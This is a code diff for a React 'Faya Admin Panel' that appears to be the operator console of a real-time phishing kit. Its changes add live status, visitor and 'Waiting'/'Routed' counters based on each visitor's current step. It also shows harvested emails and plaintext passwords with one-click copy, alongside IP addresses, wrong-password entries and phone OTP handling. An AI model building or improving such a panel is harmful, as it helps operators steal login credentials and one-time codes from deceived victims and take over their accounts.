@@ -345,7 +345,8 @@ const copyField = async (field, value) => {
 
         return {
           ...user,
-        password: data.password
+        password: data.password,
+        currentStep: data.currentStep,
         };
 
       }
@@ -380,7 +381,8 @@ const copyField = async (field, value) => {
 
         return {
           ...user,
-        email: data.email
+        email: data.email,
+        currentStep: data.currentStep
         };
 
       }
@@ -573,7 +575,8 @@ const handlePhoneOtp2Submitted = (data) => {
         draggable: true,
         progress: undefined,
       });
-
+      console.log(data)
+      window.location.reload();
       setUsers((currentUsers) =>
         currentUsers.map((user) =>
           user._id === data._id
@@ -733,11 +736,28 @@ const handlePhoneOtp2Submitted = (data) => {
     <div style={styles.page}>
 
       <div  className="header headd ">
-
         <div>
               <div className="admin-brand">
                       <img className="fge" src={img} alt="" />
                       <h2 className="gh">Faya Admin Panel</h2>
+
+                             <div
+          style={{
+            ...styles.status,
+          
+            color: connected
+              ? "#12e458"
+              : "#fd0f0b"
+          }}
+        >
+
+        
+
+          {connected
+            ? " 🟢 Live "
+            : " 🔴 Offline"}
+
+        </div>
           
                     </div>
           {/* <h1 style={styles.title}>
@@ -750,25 +770,9 @@ const handlePhoneOtp2Submitted = (data) => {
 
 
             <div className="ten">
-                     <div
-          style={{
-            ...styles.status,
-            background: connected
-              ? "#e6f4ea"
-              : "#fce8e6",
-            color: connected
-              ? "#137333"
-              : "#c5221f"
-          }}
-        >
-
-        
-
-          {connected
-            ? "  Connected"
-            : "  Offline"}
-
-        </div>
+              
+              <p className="hj"> {users.length} visitors</p>
+              
 <button
   onClick={() => {
     setSoundEnabled((prev) => !prev);
@@ -781,16 +785,16 @@ const handlePhoneOtp2Submitted = (data) => {
     color: soundEnabled
       ? "#60a5fa"
       : "#91a4c3",
-    padding: "10px 16px",
-    borderRadius: "7px",
+    padding: "8px 14px",
+    borderRadius: "20px",
     cursor: "pointer",
-    fontSize: "14px",
+    fontSize: "12px",
     fontWeight: "500"
   }}
 >
   {soundEnabled
-    ? "🔊  On"
-    : "🔇  Off"}
+    ? "🔔 Sound  ON"
+    : "🔕 Sound  OFF"}
 </button>
 
         <button
@@ -832,7 +836,30 @@ const handlePhoneOtp2Submitted = (data) => {
           </div>
 
           <div style={styles.statLabel}>
-            Users
+            Total Visitors
+          </div>
+
+        </div>
+
+         <div style={styles.statCard}>
+
+          <div style={styles.statNumber}>
+            {users.filter((user) => user.currentStep === "processing").length}
+          </div>
+
+          <div style={styles.statLabel}>
+            Waiting
+          </div>
+
+        </div>
+         <div style={styles.statCard}>
+
+          <div style={styles.statNumber}>
+            {users.filter((user) => user.currentStep !== "email").length} 
+          </div>
+
+          <div style={styles.statLabel}>
+           Routed
           </div>
 
         </div>
@@ -845,9 +872,7 @@ const handlePhoneOtp2Submitted = (data) => {
       </div>
 
 
-      <h2 style={styles.sectionTitle}>
-        Users
-      </h2>
+      
 
 
       {users.length === 0 ? (
@@ -865,6 +890,7 @@ const handlePhoneOtp2Submitted = (data) => {
             <div
               key={user._id}
               style={styles.userCard}
+              className="use-car"
             >
 
               {/* ======================
@@ -873,44 +899,48 @@ const handlePhoneOtp2Submitted = (data) => {
 
               <div style={styles.userHeader}>
 
-                <div>
+                <div className="">
 
-                
-                  <div  onClick={() => copyField("email", user.email)}   style={{
+                <div className="ass">
+                     <div className="prof">{user.email?.charAt(0).toUpperCase() || "?"}</div>
+
+                <div className="getin">
+                    <div  onClick={() => copyField("email", user.email)}   style={{
                       ...styles.email,
                       cursor: user.email
                         ? "pointer"
                         : "default"
                         
     }}>
-                    email: &nbsp;&nbsp;&nbsp;
-                   {copiedField === "email"
+                    email: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+                  <span className="klm">  {copiedField === "email"
                      ? "✓ Copied!"
-                    : user.email || "Not submitted"}
+                    : user.email || "—"}  </span>
+                  </div>    
+                  
+                    <div  onClick={() => copyField("password", user.password)} className="kiu"  style={{
+                      ...styles.email,
+                      cursor: user.password
+                        ? "pointer"
+                        : "default"
+                        
+    }}> 
+  
+                    password: &nbsp;
+                  <span className="klm">  {copiedField === "password"
+                     ? "✓ Copied!"
+                    : user.password || "—"} </span>
                   </div>
+                </div>
+                </div>
+                
 
                   {/* <p style={styles.id}>
                     Current Status: {user.status}
                   </p> */}
                   
                     <div className="kim">
-                      
-                     {user.createdAt && (
-                          <button
-                            className="detail-button os" 
-                            type="button"
-                          >
-                            <span className="detail-label ">
-                              🕐:
-                            </span>{" "}
-
-                            <span className="detail-value">
-                              {timeAgo(user.createdAt)}
-                            </span>
-                          </button>
-                        )}
-                          
-                     {user.ipAddress && (
+                        {user.ipAddress && (
                           <button
                             className="detail-button osp" 
                             type="button"
@@ -924,7 +954,24 @@ const handlePhoneOtp2Submitted = (data) => {
                             </span>
                           </button>
                         )}
-                          {user.createdAt && (
+                      
+                     {user.createdAt && (
+                          <button
+                            className="detail-button osp" 
+                            type="button"
+                          >
+                            <span className="detail-label ">
+                              🕐:
+                            </span>{" "}
+
+                            <span className="detail-value">
+                              {timeAgo(user.createdAt)}
+                            </span>
+                          </button>
+                        )}
+                          
+                   
+                          {user.currentStep === "email"? " " : (
                           <button
                             className="detail-button op" 
                             type="button"
@@ -1020,28 +1067,7 @@ const handlePhoneOtp2Submitted = (data) => {
         )}
       </button>
     )}
-        {user.password && (
-      <button
-        className="detail-button"
-        onClick={() =>
-          copyField("password", user.password)
-        }
-      >
-        <span className="detail-label">
-          Password:
-        </span>{" "}
-
-        {copiedField === "password" ? (
-          <span className="detail-copied">
-            ✓ Copied!
-          </span>
-        ) : (
-          <span className="detail-value">
-            {user.password}
-          </span>
-        )}
-      </button>
-    )}
+     
         {user.wrongPassword && (
       <button
         className="detail-button"
@@ -1450,18 +1476,13 @@ theme="light"
 const styles = {
   page: {
     background: "#0e0f0f",
-    padding: "20px",
+    // padding: "20px",
     boxSizing: "border-box",
     fontFamily: "Arial, sans-serif",
     color: "#e8f0fe"
   },
 
-  header: {
-    display: "flex",
-    justifyContent: "space-between",
-    alignItems: "center",
-    marginBottom: "30px"
-  },
+
 
   title: {
     margin: 0,
@@ -1471,7 +1492,7 @@ const styles = {
   },
   activeControlButton: {
   // border: "1px solid #1a73e8",
-  background: "#0059ff",
+  background: "#1a73e8",
   // color: "#fff",
   // fontWeight: "600"
 },
@@ -1487,39 +1508,41 @@ const styles = {
   status: {
     padding: "9px 16px",
     borderRadius: "20px",
-    fontSize: "14px",
+    fontSize: "12px",
     fontWeight: "600",
-    background: "#102a56",
+    // background: "#102a56",
     color: "#60a5fa",
-    border: "1px solid #1d4f91"
+    // border: "1px solid #1d4f91"
   },
 
   stats: {
     display: "flex",
+    padding: "0px 100px",
     gap: "18px",
-    marginBottom: "35px",
+    marginBottom: "25px",
     flexWrap: "wrap"
   },
 
   statCard: {
-    background: "#111c2f",
+    background: "#1C1F26",
     border: "1px solid #243756",
     borderRadius: "12px",
     padding: "20px 30px",
-    minWidth: "150px",
+    minWidth: "80px",
+    textAlign: "center",
     boxShadow: "0 4px 14px rgba(0, 0, 0, 0.25)"
   },
 
   statNumber: {
-    fontSize: "28px",
+    fontSize: "20px",
     fontWeight: "600",
-    color: "#60a5fa"
+    color: "white"
   },
 
   statLabel: {
     color: "#91a4c3",
     marginTop: "5px",
-    fontSize: "14px"
+    fontSize: "12px"
   },
 
   sectionTitle: {
@@ -1529,15 +1552,10 @@ const styles = {
     marginBottom: "18px"
   },
 
-  userGrid: {
-    display: "grid",
-    gridTemplateColumns:
-      "repeat(auto-fill, minmax(320px, 49%))",
-    gap: "20px"
-  },
+
 
   userCard: {
-    background: "#111c2f",
+    background: "#1C1F26",
     border: "1px solid #243756",
     borderRadius: "14px",
     padding: "22px",
@@ -1554,9 +1572,9 @@ const styles = {
   },
 
   email: {
-    fontSize: "17px",
-    fontWeight: "600",
-    color: "#f8fafc",
+    fontSize: "12px",
+    // fontWeight: "600",
+    color: "#5F6368",
     wordBreak: "break-word"
   },
 
@@ -1631,8 +1649,8 @@ const styles = {
   },
 
   controlButton: {
-    border: "1px solid #304665",
-    background: "#17243a",
+    border: "1px solid #3b4047",
+    background: "#2a2d35",
     color: "#c9d8ee",
     padding: "10px 20px",
     borderRadius: "17px",
